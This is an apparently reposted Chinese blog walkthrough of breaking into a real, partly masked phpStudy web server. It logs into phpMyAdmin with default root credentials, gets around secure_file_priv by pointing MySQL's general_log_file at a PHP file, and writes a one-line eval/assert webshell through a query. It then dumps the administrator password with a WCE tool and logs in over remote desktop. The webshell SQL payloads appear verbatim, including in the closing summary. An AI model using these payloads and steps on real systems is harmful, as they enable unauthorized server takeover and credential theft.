+++
title = "Mysql root账号general_log_file方法获取webshell"
author = "Hzllaga"
date =  2018-01-21
description = "现实情况中，由于Mysql版本较高以及配置文件的缘故，往往无法直接通过root账号写入网站真实路劲下获取webshell；通过研究发现其实可以通过一些方法绕过，同样可以获取webshell。"
categories = ["转载"]
tags = ["MySQL"]
+++
现实情况中，由于Mysql版本较高以及配置文件的缘故，往往无法直接通过root账号写入网站真实路劲下获取webshell；通过研究发现其实可以通过一些方法绕过，同样可以获取webshell

在前面的phpmyadmin漏洞利用专题中介绍了如何通过root账号来获取webshell，但在现实情况中，由于Mysql版本较高以及配置文件的缘故，往往无法直接通过root账号写入网站真实路劲下获取webshell；通过研究发现其实可以通过一些方法绕过，同样可以获取webshell，下面将整个渗透过程和方法跟大家分享。
## 信息收集
目标站点访问其子域名，如图1所示，发现该站点是使用phpStudy2014搭建的，通过phpinfo信息泄露，可以获取网站的绝对路径“D:/phpStudy/WWW”，服务器为Windows Server 2003 ，phpstudy探针文件“D:/phpStudy/WWW/l.php”。
![](https://cdn.wtfsec.org/img/20200223160610.jpg)
## 获取root账号和密码
phpStudy默认账号为root/root，使用其进行登录，成功登录系统，如果不是这个账号和密码，可以使用phpmyadmin暴力破解工具进行暴力破解，如图2所示，登录后看目前使用的数据应该是www数据库。查看mysql数据库中的user表中的数据，如图3所示，清一色的相同密码。
![](https://cdn.wtfsec.org/img/20200223160711.jpg)
图2获取root账号和密码
![](https://cdn.wtfsec.org/img/20200223160731.jpg)
图3 mysql数据库user表多个账号使用相同密码
## 直接导出webshell失败
既然知道了网站真实路径“D:/phpStudy/WWW”和root账号，最简单的方法就是直接导出webshell：
{{< highlight sql >}}
select ‘<?php @eval($_POST[cmd]);?>’INTO OUTFILE ‘D:/phpStudy/WWW/cmd.php’{{< /highlight >}}，如图4所示，在以往是顺利成章的获取webshell，但这次显示错误信息：

The MySQL server is running with the --secure-file-priv option so it cannot execute this statement

意思是Mysql服务器运行“–secure-file-priv”选项，所以不能执行这个语句。
![](https://cdn.wtfsec.org/img/20200223161001.jpg)
图4导出webshell失败
## secure_file_priv选项
在mysql中使用secure_file_priv配置项来完成对数据导入导出的限制，前面的webshell导出就是如此，在实际中常常使用语句来导出数据表内容，例如把mydata.user表的数据导出来：
{{< highlight sql >}}
select * from mydata.user into outfile '/home/mysql/user.txt';
{{< /highlight >}}
在mysql的官方给出了“–secure-file-priv=name Limit LOAD DATA, SELECT … OUTFILE, and LOAD_FILE() to files within specified directory”解释，限制导出导入文件到指定目录，其具体用法：
1. 限制mysqld不允许导入和导出
{{< highlight sql >}}
mysqld --secure_file_prive=null
{{< /highlight >}}
2. 限制mysqld的导入和导出只能发生在/tmp/目录下
{{< highlight sql >}}
mysqld --secure_file_priv=/tmp/
{{< /highlight >}}
3. 不对mysqld 的导入和导出做限制，在/etc/my.cnf文件中不指定值。
## 通过general_log和general_log_file来获取webshell
mysql打开general log之后，所有的查询语句都可以在general log文件中以可读的方式得到，但是这样general log文件会非常大，所以默认都是关闭的。有的时候为了查错等原因，还是需要暂时打开general log的。换句话说general_log_file会记录所有的查询语句，以原始的状态来显示，如果将general_log开关打开，general_log_file设置为一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，通过访问general_log_file指定的文件来获取webshell。在mysql中执行查询：
{{< highlight sql >}}
set global general_log='on';
SET global general_log_file='D:/phpStudy/WWW/cmd.php';
SELECT '<?php assert($_POST["cmd"]);?>';
{{< /highlight >}}
如图5，图6和图7所示，分别打开general_log开关，设置general_log_file文件，执行查询。
![](https://cdn.wtfsec.org/img/20200223162254.jpg)
图5打开general_log开关
![](https://cdn.wtfsec.org/img/20200223162444.jpg)
图6设置general_log_file文件
![](https://cdn.wtfsec.org/img/20200223162456.jpg)
图7执行webshell查询
## 获取webshell
在浏览器中打开地址http://******.hy******.cn/cmd.php，如图8所示，会显示mysql查询的一些信息，由于一句话后门通过查询写入了日志文件cmd.php，因此通过中国菜刀一句话后门可以成功获取webshell，如图9所示。
![](https://cdn.wtfsec.org/img/20200223162530.jpg)
图8查看文件
![](https://cdn.wtfsec.org/img/20200223162551.jpg)
图9获取webshell
## 服务器密码获取
1. 查看服务器权限及用户权限
通过中国菜刀一句话后门管理工具，打开远程终端命令执行，如图10所示，分别执行“whomai”、“net user”、“net localgroup administrator”命令来查看当前用户的权限，当前系统所有用户，管理员用户情况。
![](https://cdn.wtfsec.org/img/20200223162656.jpg)
图10查看当前用户权限
2. 上传wce密码获取工具
直接执行g86.exe顺利获取管理员密码，如图11所示，开始执行g64.exe没有成功是因为系统是32位操作系统。
![](https://cdn.wtfsec.org/img/20200223162718.jpg)
图11获取管理员密码
## 获取远程终端端口
通过命令 tasklist /svc | find “TermService”及netstat -ano | find “1792″ 命令来获取当前的3389端口为8369端口，tasklist /svc | find “TermService”获取的是远程终端服务对应的进程号，netstat -ano | find “1792″查看进程号1792所对应的端口，在实际过程中1792值会有变化。
![](https://cdn.wtfsec.org/img/20200223162746.jpg)
图12获取3389端口
## 登录3338
打开mstsc，在连接地址中输入202.58.***.***:8369，输入获取的管理员和密码进行登录，如图13所示，成功登录服务器。
![](https://cdn.wtfsec.org/img/20200223162813.jpg)
## 总结
1. 查看genera文件配置情况
{{< highlight sql >}}
show global variables like "%genera%";
{{< /highlight >}}
2. 关闭general_log
{{< highlight sql >}}
set global general_log=off;
{{< /highlight >}}
3. 通过general_log选项来获取webshell
{{< highlight sql >}}
set global general_log='on';
SET global general_log_file='D:/phpStudy/WWW/cmd.php';
SELECT '<?php assert($_POST["cmd"]);?>';
{{< /highlight >}}




